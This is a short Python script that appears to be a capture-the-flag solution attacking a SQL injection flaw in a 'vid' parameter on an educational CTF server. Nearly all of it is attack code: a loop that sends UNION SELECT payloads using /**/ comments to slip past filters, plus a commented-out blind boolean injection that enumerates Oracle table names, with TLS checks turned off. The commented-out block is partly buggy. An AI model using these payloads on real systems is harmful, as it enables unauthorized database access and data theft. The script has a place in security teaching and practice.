import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = 'https://edu-ctf.csie.org:10159/video.php?vid=-1'

for first in ['null', '1', '\'a\'', '\"a\"' ]:
    for second in ['null', '1', '\'a\'', '\"a\"']:
        for third in ['null', '1', '\'a\'', '\"a\"']:
            payload = '/**/union/**/select/**/' + first + ',' + second + ',' + third + '/**/from/**/dual'

            url2 = url + payload
            result = requests.get(url2, verify=False)

            print('url now %s'%(url2))
            #if 'Error' not in result.text and 'Bad cat!' not in result.text:
                # print(result.text)

'''
for i in range(0, 100):
    url2 = url + '(case/**/when/**/(length(SELECT/**/TABLE_NAME/**/FROM/**/SELECT/**/TABLE_NAME/**/,/**/rownum/**/as/**/r/**/FROM/**/all_tables/**/WHERE/**/r=1)='+ str(i) + ')/**/then/**/1/**/else/**/2/**/end)'
    result = requests.get(url2, verify=False)
    if 'Error' not in result.text:
        print(result.text)

print('end 1')
input()
for i in range(0, 255):
    print('---------------lognumber %d ----------'%(i))

    char = chr(i)
    payload = '(case/**/when/**/(' + char +')/**/then/**/1/**/else/**/2/**/end)'
    print(payload)
    url += payload
    result = requests.get(url, verify=False)

    #if 'Error' not in result.text and 'Bad cat!' not in result.text:
    print(result.text)
#print('--------------')
#print(result.headers)

'''
